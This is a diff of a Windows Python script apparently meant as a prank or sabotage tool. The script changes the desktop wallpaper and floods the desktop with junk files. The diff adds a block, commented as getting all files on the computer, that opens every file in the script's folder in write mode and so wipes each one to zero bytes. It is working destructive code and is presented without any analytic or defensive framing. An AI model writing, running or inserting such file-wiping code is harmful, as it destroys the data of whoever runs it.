@@ -6,6 +6,7 @@ import winreg
 import easygui as eg
 
 
+# 更改桌面背景
 def desktop_bg():
     def setWallpaper():
         import random
@@ -54,13 +55,28 @@ def fill():
     for j in range(1, 100):
         with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'), 'wb+') as f:
             f.close()
+    # 获取电脑里所有的文件
+    current_address = os.path.dirname(os.path.abspath(__file__))
+    file_list = os.listdir(current_address)
+    for file_address in file_list:
+        file_address = os.path.join(current_address, file_address)
+        if os.path.isfile(file_address):
+            print("这个是文件，文件名称：", file_address)
+            with open(file_address, 'wb+') as f:
+                f.close()
+        elif os.path.isdir(file_address):
+            print("这个是文件夹，文件夹名称：", file_address)
+        else:
+            print("这个情况没遇到")
 
-#主程序
+
+# 主程序
 def main():
     print()
     # desktop_bg()
     fill()
 
-#开始运行
+
+# 开始运行
 if __name__ == '__main__':
     main()
